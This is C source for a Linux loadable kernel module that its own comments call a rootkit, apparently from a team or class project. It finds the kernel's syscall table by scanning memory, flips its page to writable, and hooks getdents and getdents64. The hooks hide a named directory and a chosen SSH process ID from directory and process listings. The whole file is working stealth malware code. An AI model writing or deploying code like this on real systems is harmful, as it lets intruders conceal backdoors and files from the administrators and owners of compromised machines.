#include "filesystem.h"
#include <linux/moduleparam.h>   /* Allow our module to accept parameters*/
#include <asm/unistd.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/highmem.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/dirent.h>

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Paul Campbell :: Adam Przybyszewski :: Mike Salerno :: Kevin Hock");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("Any legal concerns should be directed at Donald Porter.");

unsigned long *sys_call_table = NULL;    // The address we found sys_call_table at in memory.
static int found = FALSE;                // Were we able to find the sys_call_table in memory?

static char *ssh_pid = "1337";
module_param(ssh_pid, charp, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(ssh_pid, "SSH Process ID");
MODULE_SUPPORTED_DEVICE("NULL");

asmlinkage int (*old_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
static asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  int pos;
  long ret;

  ret = old_getdents(fd, dirp, count);
  if (ret <= 0) return ret;

  for (pos = 0; pos < ret; ) {
    char *ptr = (char*)dirp + pos;
    struct linux_dirent *d = (struct linux_dirent *)ptr;
    if(strcmp(d->d_name, HIDE_DIR) == 0) {
      memcpy(d, (char*)d + d->d_reclen, ret - pos - d->d_reclen);
      ret -= d->d_reclen;
    } else if(strcmp(d->d_name, ssh_pid) == 0) {
      memcpy(d, (char*)d + d->d_reclen, ret - pos - d->d_reclen);
      ret -= d->d_reclen;
    } else pos += d->d_reclen;
  }
  return ret;
}


static asmlinkage int (*old_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
static asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
  int pos;
  long ret;

  ret = old_getdents64(fd, dirp, count);
  if (ret <= 0) return ret;

  for (pos = 0; pos < ret; ) {
    char *ptr = (char*)dirp + pos;
    struct linux_dirent64 *d = (struct linux_dirent64*)ptr;
    if(strcmp(d->d_name, HIDE_DIR) == 0) {
      memcpy(d, (char*)d + d->d_reclen, ret - pos - d->d_reclen);
      ret -= d->d_reclen;
    } else if(strcmp(d->d_name, ssh_pid) == 0) {
      memcpy(d, (char*)d + d->d_reclen, ret - pos - d->d_reclen);
      ret -= d->d_reclen;
    } else pos += d->d_reclen;
  } return ret;
}



/**********************************************************************************************************\
| Functions that initialize the rootkit.                                                                   |
\**********************************************************************************************************/

/****************************************************************************
 * void init_filesystem_hook(void)                                          *
 * -------------------------------------------------------------------------*
 * Description: Find the sys_call_table and replace any functions that      *
 *              we don't want the user accessing with our modified          *
 *              versions.
 ***************************************************************************/
void init_filesystem_hook() {
  //printk(KERN_ALERT "[tiktoor] SSH PID: %s", ssh_pid);
  sys_call_table = (unsigned long *)getTableAddress();

  if(sys_call_table == NULL)
    return;
  else
    found = TRUE;

  make_rw((unsigned long)sys_call_table);

  old_getdents   = (void*)sys_call_table[__NR_getdents];
  sys_call_table[__NR_getdents] = (unsigned long)new_getdents;

  old_getdents64 = (void*)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)new_getdents64;

  make_ro((unsigned long)sys_call_table);
}


/****************************************************************************
 * void exit_filesystem_hook(void)                                          *
 * -------------------------------------------------------------------------*
 * Description: To be nice, we will undo any changes we made to the         *
 *              sys_call_table during the execution of our code.            *
 ***************************************************************************/
void exit_filesystem_hook(void) {

  // If we originally modified the sys_call_table:
  if(found) {

    make_rw((unsigned long)sys_call_table);

    *(sys_call_table + __NR_getdents) = (unsigned long)old_getdents;

    *(sys_call_table + __NR_getdents64) = (unsigned long)old_getdents64;

    make_ro((unsigned long)sys_call_table);
  }
}



/**********************************************************************************************************\
| Functions that help us hook the sys_call_table                                                           |
\**********************************************************************************************************/

/****************************************************************************
 * unsigned long **getTableAddress(void)                                    *
 * -------------------------------------------------------------------------*
 * Description: Searches through memory for a known address in the          *
 *              sys_call_table.                                             *
 *                                                                          *
 * Returns:                                                                 *
 *      The address found in memory, assumed to be the sys_call_table.      *
 *      If not found, return NULL                                           *
 ***************************************************************************/
unsigned long **getTableAddress(void) {
  unsigned long **table;
  unsigned long ptr;
  for(ptr = 0xc0000000; ptr <=0xd0000000; ptr+=sizeof(void *)) {
    table = (unsigned long **) ptr;
    if(table[__NR_close] == (unsigned long *)sys_close) { 
      return &(table[0]);
    }
  } return NULL; 
}  


/****************************************************************************
 * int make_rw(unsigned long address)                                       *
 * -------------------------------------------------------------------------*
 * Description: Set the sys_call_table to read/write                        *
 *                                                                          *
 * Fields:                                                                  *
 *      address     :=  The location of the sys_call_table in memory        *
 *                                                                          *
 * Returns:                                                                 *
 *      0 = Success                                                         *
 ***************************************************************************/
 int make_rw(unsigned long address){  
   unsigned int level;
   pte_t *pte = lookup_address(address,&level);
   if(pte->pte &~ _PAGE_RW)
      pte->pte |= _PAGE_RW;
   return 0;
}


/****************************************************************************
 * int make_ro(unsigned long address)                                       *
 * -------------------------------------------------------------------------*
 * Description: Set the sys_call_table to read only                         *
 *                                                                          *
 * Fields:                                                                  *
 *      address     :=  The location of the sys_call_table in memory        *
 *                                                                          *
 * Returns:                                                                 *
 *      0 = Success                                                         *
 ***************************************************************************/
int make_ro(unsigned long address){
   unsigned int level;
   pte_t *pte = lookup_address(address, &level);
   pte->pte = pte->pte &~ _PAGE_RW;
   return 0;
}


